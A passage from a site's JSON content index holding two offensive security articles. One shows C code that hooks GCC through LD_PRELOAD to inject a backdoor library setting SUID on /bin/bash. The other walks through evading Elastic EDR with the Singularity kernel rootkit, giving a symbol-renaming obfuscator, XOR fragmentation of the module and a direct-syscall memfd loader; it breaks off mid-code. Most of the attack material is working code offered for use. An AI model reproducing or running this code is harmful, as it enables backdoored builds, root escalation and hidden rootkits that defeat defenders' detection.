== 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void 